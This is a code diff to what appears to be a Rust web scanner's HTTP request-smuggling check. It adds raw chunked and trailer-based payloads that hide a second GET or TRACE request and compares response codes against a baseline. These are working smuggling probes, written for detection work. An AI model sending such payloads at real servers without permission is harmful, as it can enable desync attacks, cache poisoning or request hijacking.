@@ -45,9 +45,22 @@ impl TrailSmugTask {
             0\r\n\
             any: value\r\n\
             GET /hopefully404?: HTTP/1.1\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
+            X: "
+        ));
+
+        payloads.push(format!(
+            "\
+            POST {path} HTTP/1.1\r\n\
             Host: {authority}\r\n\
-            \r\n"
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Transfer-Encoding: chunked\r\n\
+            \r\n\
+            2\r\n\
+            aa\r\n\
+            0\r\n\
+            any: value\n\n\
+            GET /hopefully404?: HTTP/1.1\r\n\
+            X: "
         ));
 
         payloads.push(format!(
@@ -61,18 +74,14 @@ impl TrailSmugTask {
             aa\r\n\
             0\r\n\
             a\r\n\
-            GET /hopefully404?: HTTP/1.1\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
-            Host: {authority}\r\n\
-            \r\n"
+            TRACE /hopefully404?: HTTP/1.1\r\n\
+            X: "
         ));
 
         let smug = format!(
             "\
-            GET /hopefully404 HTTP/1.1\r\n\
-            Host: {authority}\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
-            \r\n"
+            TRACE /hopefully404 HTTP/1.1\r\n\
+            X: "
         );
         let len = smug.len();
 
@@ -88,6 +97,26 @@ impl TrailSmugTask {
             any: value\r\n\
             a\r\n\
             \r\n\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Content-Length: {len}\r\n\
+            \r\n\
+            {smug}"
+        ));
+
+        payloads.push(format!(
+            "\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Transfer-Encoding: chunked\r\n\
+            \r\n\
+            0\r\n\
+            any: value\n\
+            \n\
             POST {path} HTTP/1.1\r\n\
             Host: {authority}\r\n\
             Connection: keep-alive\r\n\
@@ -131,7 +160,7 @@ impl Task for TrailSmugTask {
             }
         };
 
-        if [301, 302, 404, 429, 502, 503].contains(&baseline_res.status) {
+        if [301, 302, 403, 404, 429, 502, 503].contains(&baseline_res.status) {
             return Ok("".to_string());
         }
 
@@ -146,7 +175,7 @@ impl Task for TrailSmugTask {
                     .await
                 {
                     Ok(res) => {
-                        if res.status != baseline_res.status {
+                        if res.status != baseline_res.status && ![403, 429].contains(&res.status) {
                             if i == 0 {
                                 diff = true;
                             } else if diff {
